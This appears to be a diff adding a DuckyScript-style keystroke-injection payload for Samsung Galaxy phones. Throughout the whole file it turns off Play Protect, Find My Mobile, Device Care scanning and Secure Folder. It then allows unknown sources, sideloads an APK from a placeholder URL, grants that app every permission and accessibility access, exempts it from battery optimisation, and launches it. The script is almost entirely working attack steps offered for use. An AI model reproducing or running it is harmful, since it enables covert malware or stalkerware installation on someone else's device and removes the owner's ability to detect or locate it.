@@ -1,0 +1,355 @@
+REM Samsung Security Bypass and App Installation
+REM Author: AryanVBW
+REM Version: 1.0
+REM Optimized for Samsung OneUI (Galaxy devices)
+
+REM ---- INITIAL SETUP ----
+DELAY 1500
+
+REM Wake up the device
+ENTER
+DELAY 500
+ENTER
+DELAY 1000
+
+REM Swipe up to unlock (Samsung method)
+SWIPE 500 1800 500 800
+DELAY 1500
+
+REM ---- STEP 1: DISABLE SAMSUNG KNOX AND SECURITY ----
+
+REM Open Settings
+HOME
+DELAY 800
+SWIPE 500 1700 500 700
+DELAY 1000
+STRING settings
+DELAY 800
+ENTER
+DELAY 2000
+
+REM Navigate to Biometrics and security (Samsung OneUI path)
+STRING biometrics
+DELAY 800
+ENTER
+DELAY 1500
+
+REM Disable "Google Play Protect" in Samsung devices
+STRING play protect
+DELAY 800
+ENTER
+DELAY 1500
+TAB
+DELAY 300
+ENTER
+DELAY 1000
+
+REM Confirm turning off
+STRING turn off
+DELAY 800
+TAB
+DELAY 300
+ENTER
+DELAY 1500
+
+REM Go back to security settings
+BACK
+DELAY 800
+
+REM Disable "Find My Mobile" (Samsung specific)
+STRING find my mobile
+DELAY 800
+ENTER
+DELAY 1500
+TAB
+DELAY 300
+ENTER
+DELAY 1000
+
+REM ---- STEP 2: DISABLE SAMSUNG SECURE FOLDER ----
+
+REM Go back to main settings
+BACK
+DELAY 800
+BACK
+DELAY 800
+
+REM Find Secure Folder (Samsung specific)
+STRING secure folder
+DELAY 800
+ENTER
+DELAY 1500
+
+REM Disable or uninstall Secure Folder if enabled
+STRING uninstall
+DELAY 800
+TAB
+DELAY 300
+ENTER
+DELAY 1000
+STRING confirm
+DELAY 800
+TAB
+DELAY 300
+ENTER
+DELAY 2000
+
+REM ---- STEP 3: ENABLE UNKNOWN SOURCES (SAMSUNG PATH) ----
+
+REM Go back to main settings
+BACK
+DELAY 800
+BACK
+DELAY 800
+
+REM Navigate to Apps section in Samsung OneUI
+STRING apps
+DELAY 800
+ENTER
+DELAY 1500
+
+REM Tap on three-dot menu (Samsung UI)
+TAB
+DELAY 300
+TAB
+DELAY 300
+TAB
+DELAY 300
+TAB
+DELAY 300
+ENTER
+DELAY 1000
+
+REM Select Special access
+STRING special access
+DELAY 800
+ENTER
+DELAY 1500
+
+REM Find "Install unknown apps"
+STRING install unknown
+DELAY 800
+ENTER
+DELAY 1500
+
+REM Select Chrome browser
+STRING chrome
+DELAY 800
+ENTER
+DELAY 1500
+
+REM Enable permission (Samsung toggle)
+TAB
+DELAY 300
+ENTER
+DELAY 1000
+
+REM ---- STEP 4: DISABLE SAMSUNG DEVICE CARE SECURITY ----
+
+REM Go back to main settings
+BACK
+DELAY 800
+BACK
+DELAY 800
+BACK
+DELAY 800
+
+REM Navigate to Device care (Samsung specific)
+STRING device care
+DELAY 800
+ENTER
+DELAY 1500
+
+REM Go to Security
+STRING security
+DELAY 800
+ENTER
+DELAY 1500
+
+REM Disable security scanning
+TAB
+DELAY 300
+ENTER
+DELAY 1000
+
+REM ---- STEP 5: DOWNLOAD AND INSTALL APK (SAMSUNG METHOD) ----
+
+REM Open Samsung Internet Browser (or Chrome)
+HOME
+DELAY 800
+SWIPE 500 1700 500 700
+DELAY 1000
+STRING internet
+DELAY 800
+ENTER
+DELAY 3000
+
+REM Access address bar (Samsung browser)
+TAB
+DELAY 500
+ENTER
+DELAY 1000
+
+REM Enter APK URL
+STRING https://example.com/app.apk
+DELAY 1000
+ENTER
+DELAY 5000
+
+REM Wait for download to start and complete
+DELAY 10000
+
+REM Open notification shade (Samsung gesture)
+SWIPE 500 100 500 1700
+DELAY 1500
+
+REM Tap on download notification
+ENTER
+DELAY 3000
+
+REM Handle Samsung security warning
+STRING install
+DELAY 800
+TAB
+DELAY 300
+TAB
+DELAY 300
+ENTER
+DELAY 3000
+
+REM Confirm installation despite warning
+TAB
+DELAY 300
+TAB
+DELAY 300
+STRING install anyway
+DELAY 800
+ENTER
+DELAY 5000
+
+REM ---- STEP 6: GRANT PERMISSIONS (SAMSUNG PERMISSION MODEL) ----
+
+REM Go to Settings for Samsung permission management
+HOME
+DELAY 800
+SWIPE 500 1700 500 700
+DELAY 1000
+STRING settings
+DELAY 800
+ENTER
+DELAY 2000
+
+REM Navigate to Apps in Samsung OneUI
+STRING apps
+DELAY 800
+ENTER
+DELAY 1500
+
+REM Find the newly installed app
+STRING app
+DELAY 800
+ENTER
+DELAY 1500
+
+REM Go to Permissions in Samsung OneUI
+STRING permissions
+DELAY 800
+ENTER
+DELAY 1500
+
+REM Grant all permissions (Samsung's permission UI)
+REPEAT 10 {
+    TAB
+    DELAY 300
+    ENTER
+    DELAY 1000
+    STRING allow
+    DELAY 500
+    ENTER
+    DELAY 800
+    BACK
+    DELAY 800
+}
+
+REM ---- STEP 7: ENABLE SAMSUNG ACCESSIBILITY SERVICES ----
+
+REM Go to Settings
+HOME
+DELAY 800
+SWIPE 500 1700 500 700
+DELAY 1000
+STRING settings
+DELAY 800
+ENTER
+DELAY 2000
+
+REM Navigate to Accessibility in Samsung OneUI
+STRING accessibility
+DELAY 800
+ENTER
+DELAY 1500
+
+REM Find installed app in Samsung accessibility list
+STRING app
+DELAY 800
+ENTER
+DELAY 1500
+
+REM Enable service in Samsung OneUI
+TAB
+DELAY 300
+ENTER
+DELAY 1000
+
+REM Confirm enabling (Samsung dialog)
+STRING allow
+DELAY 800
+TAB
+DELAY 300
+TAB
+DELAY 300
+ENTER
+DELAY 2000
+
+REM ---- STEP 8: DISABLE SAMSUNG AUTO-RESTART ----
+
+REM Go back to main settings
+BACK
+DELAY 800
+BACK
+DELAY 800
+
+REM Navigate to Battery settings
+STRING battery
+DELAY 800
+ENTER
+DELAY 1500
+
+REM Disable auto optimization
+STRING optimization
+DELAY 800
+ENTER
+DELAY 1500
+TAB
+DELAY 300
+ENTER
+DELAY 1000
+
+REM ---- STEP 9: LAUNCH THE APP ----
+
+REM Return to home screen
+HOME
+DELAY 800
+
+REM Open app drawer (Samsung method)
+SWIPE 500 1700 500 700
+DELAY 1000
+
+REM Find and open the app
+STRING app
+DELAY 800
+ENTER
+DELAY 2000
+
+REM ---- FINISHED ----
+REM Samsung security has been bypassed and app installed with full permissions
